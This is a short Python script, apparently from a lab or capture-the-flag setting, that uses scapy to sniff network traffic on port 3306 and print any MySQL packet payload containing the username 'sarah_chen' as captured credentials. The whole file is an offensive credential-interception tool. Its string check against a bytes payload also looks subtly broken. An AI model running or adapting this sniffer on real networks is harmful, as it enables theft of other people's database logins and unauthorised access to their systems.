#!/usr/bin/env python3
from scapy.all import *

def extract_mysql_creds(packet):
        print(packet)
        payload = packet[Raw].load
        useful_pkt = "sarah_chen" in payload
        if useful_pkt:
            print(f"[CREDS CAPTURED] {payload}")
            return True
        return False
print("[CAPTURE] Monitoring for MySQL credentials...")
sniff(filter="port 3306", prn=extract_mysql_creds)
